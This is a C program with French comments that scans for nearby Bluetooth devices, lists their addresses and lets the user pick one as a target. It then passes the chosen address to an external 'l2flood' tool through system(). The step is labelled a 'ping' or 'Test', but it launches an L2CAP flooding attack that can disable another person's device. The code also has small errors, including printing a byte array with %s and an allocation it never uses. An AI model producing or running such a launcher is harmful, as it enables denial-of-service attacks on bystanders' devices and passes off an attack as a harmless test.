#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

void listBluetoothDevices() {
    inquiry_info *devices = NULL;
    int maxDevices = 15;
    int numDevices;

    // HCI Socket
    int hciSocket = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
    if (hciSocket < 0) {
        perror("Impossible d'ouvrir le socket HCI");
        exit(1);
    }

    // Configure une requête d'exploration Bluetooth
    inquiry_info *ii = (inquiry_info *)malloc(maxDevices * sizeof(inquiry_info));
    numDevices = hci_inquiry(hci_get_route(NULL), 8, maxDevices, NULL, &devices, IREQ_CACHE_FLUSH);

    // Affiche la liste des appareils Bluetooth détectés
    for (int i = 0; i < numDevices; i++) {
        char addr[18];
        ba2str(&(devices + i)->bdaddr, addr);
        printf("%d. %s - %s\n", i + 1, addr, (devices + i)->dev_class);
    }

    free(ii);
    close(hciSocket);
}

void pingBluetoothDevice(const char *bdaddr) {
    // Appel à la fonction de ping avec l'adresse bdaddr
    printf("Test...\n");
    char command[100];
    snprintf(command, sizeof(command), "./l2flood -i hci0 %s", bdaddr);
    system(command);
}

int main() {
    int choice;
    char bdaddr[18];

    printf("Liste des appareils Bluetooth détectés :\n");
    listBluetoothDevices();

    printf("\nChoisissez l'appareil à tester (entrez le numéro) : ");
    scanf("%d", &choice);

    if (choice <= 0) {
        printf("Choix invalide.\n");
        return 1;
    }

    inquiry_info *devices = NULL;
    int maxDevices = 8;
    int numDevices;
    int hciSocket = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);

    if (hciSocket < 0) {
        perror("Impossible d'ouvrir le socket HCI");
        exit(1);
    }

    numDevices = hci_inquiry(hci_get_route(NULL), 8, maxDevices, NULL, &devices, IREQ_CACHE_FLUSH);
    if (choice <= numDevices) {
        ba2str(&(devices + choice - 1)->bdaddr, bdaddr);
        printf("Vous avez choisi : %s\n", bdaddr);
        pingBluetoothDevice(bdaddr);
    } else {
        printf("Choix invalide.\n");
    }

    free(devices);
    close(hciSocket);

    return 0;
}
